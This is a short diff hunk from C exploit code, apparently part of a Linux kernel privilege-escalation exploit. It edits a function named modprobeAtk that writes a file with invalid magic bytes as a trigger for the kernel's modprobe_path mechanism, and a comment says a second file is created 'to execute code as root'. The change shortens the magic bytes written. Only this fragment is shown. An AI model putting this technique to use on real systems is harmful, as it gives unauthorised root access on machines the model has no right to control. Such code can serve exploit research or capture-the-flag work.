@@ -74,7 +74,7 @@ size_t swab(size_t val){
 void modprobeAtk(char * path, char * cmd){
     // Create a funky file as trigger 
     char * buf = calloc(1,0x400);
-    snprintf(buf,0x400-1,"echo -ne '\\xff\\xff\\xff\\xff' > %s/funky_guy",path);
+    snprintf(buf,0x400-1,"echo -ne '\\xff' > %s/funky_guy",path);
     system(buf);
     // Create a file to execute code as root
     memset(buf,0,0x400);
